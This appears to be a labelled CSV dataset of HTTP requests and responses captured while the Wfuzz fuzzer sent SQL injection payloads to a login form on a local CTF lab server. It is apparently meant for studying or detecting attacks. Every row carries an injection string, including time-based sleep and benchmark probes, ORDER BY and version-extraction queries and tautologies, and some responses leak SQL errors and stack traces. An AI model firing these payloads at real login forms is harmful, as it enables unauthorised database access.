attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Connection,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
sql,192.168.1.39,80,"username=' or benchmark(10000000,MD5(1))#&password=admin123&submit=submit",*/*,,73,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:08 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56432
sql,192.168.1.39,80,"username="" or sleep(__TIME__)=""&password=admin123&submit=submit",*/*,,63,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:08 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56433
sql,192.168.1.39,80,username=')) or sleep(__TIME__)='&password=admin123&submit=submit,*/*,,65,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) or sleep(__TIME__)='' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,592,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:08 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56434
sql,192.168.1.39,80,username=;waitfor delay '0:0:__TIME__'--&password=admin123&submit=submit,*/*,,72,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0:0:__TIME__'--' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,584,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:08 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56435
sql,192.168.1.39,80,"username="")) or sleep(__TIME__)=""&password=admin123&submit=submit",*/*,,65,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:08 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56436
sql,192.168.1.39,80,username=1)) or sleep(__TIME__)#&password=admin123&submit=submit,*/*,,64,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:08 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56437
sql,192.168.1.39,80,"username="") or sleep(__TIME__)=""&password=admin123&submit=submit",*/*,,64,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:08 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56439
sql,192.168.1.39,80,username=1 or sleep(__TIME__)#&password=admin123&submit=submit,*/*,,62,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:08 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56440
sql,192.168.1.39,80,"username=and (select substring(@@version,3,1))='c'&password=admin123&submit=submit",*/*,,82,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'c'' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,571,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56447
sql,192.168.1.39,80,username=ORDER BY 31337#&password=admin123&submit=submit,*/*,,56,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56450
sql,192.168.1.39,80,"username=and (select substring(@@version,3,1))='X'&password=admin123&submit=submit",*/*,,82,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'X'' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,571,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56443
sql,192.168.1.39,80,username=ORDER BY 29#&password=admin123&submit=submit,*/*,,53,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56444
sql,192.168.1.39,80,username=ORDER BY 25#&password=admin123&submit=submit,*/*,,53,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56445
sql,192.168.1.39,80,username=ORDER BY 26#&password=admin123&submit=submit,*/*,,53,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56446
sql,192.168.1.39,80,username=ORDER BY 23#&password=admin123&submit=submit,*/*,,53,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56448
sql,192.168.1.39,80,username=ORDER BY 2&password=admin123&submit=submit,*/*,,51,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56449
sql,192.168.1.39,80,"username=and (select substring(@@version,2,1))='y'&password=admin123&submit=submit",*/*,,82,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'y'' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,571,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56451
sql,192.168.1.39,80,"username=and (select substring(@@version,3,1))='S'&password=admin123&submit=submit",*/*,,82,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'S'' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,571,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56452
sql,192.168.1.39,80,username=declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)&password=admin123&submit=submit,*/*,,142,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56455
sql,192.168.1.39,80,username=x' OR full_name LIKE '%Bob%&password=admin123&submit=submit,*/*,,68,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'full_name' in 'where clause' in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,424,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56456
sql,192.168.1.39,80,username=29%&password=admin123&submit=submit,*/*,,44,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56457
sql,192.168.1.39,80,username=26%&password=admin123&submit=submit,*/*,,44,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56458
sql,192.168.1.39,80,username=//*&password=admin123&submit=submit,*/*,,44,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56459
sql,192.168.1.39,80,username=' or 3=3 --&password=admin123&submit=submit,*/*,,52,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,551,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56460
sql,192.168.1.39,80,username=1;SELECT%20*&password=admin123&submit=submit,*/*,,53,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56461
sql,192.168.1.39,80,username='%20or%201=1&password=admin123&submit=submit,*/*,,53,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,569,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56462
sql,192.168.1.39,80,username=' or 3=3&password=admin123&submit=submit,*/*,,49,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,569,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56463
sql,192.168.1.39,80,username='sqlattempt1&password=admin123&submit=submit,*/*,,53,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'sqlattempt1' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,580,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:28 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56464
sql,192.168.1.39,80,username=or SLEEP(5)&password=admin123&submit=submit,*/*,,52,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56477
sql,192.168.1.39,80,username=or SLEEP(5)--&password=admin123&submit=submit,*/*,,54,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56468
sql,192.168.1.39,80,"username=SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/&password=admin123&submit=submit",*/*,,89,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56469
sql,192.168.1.39,80,username=pg_SLEEP(5)#&password=admin123&submit=submit,*/*,,53,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56470
sql,192.168.1.39,80,username=' or sleep(5)#&password=admin123&submit=submit,*/*,,55,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56471
sql,192.168.1.39,80,"username=benchmark(50000000,MD5(1))&password=admin123&submit=submit",*/*,,67,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56472
sql,192.168.1.39,80,username=waitfor delay '00:00:05'#&password=admin123&submit=submit,*/*,,66,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '00:00:05'#' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,579,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56473
sql,192.168.1.39,80,username=or SLEEP(5)='&password=admin123&submit=submit,*/*,,54,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,551,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56474
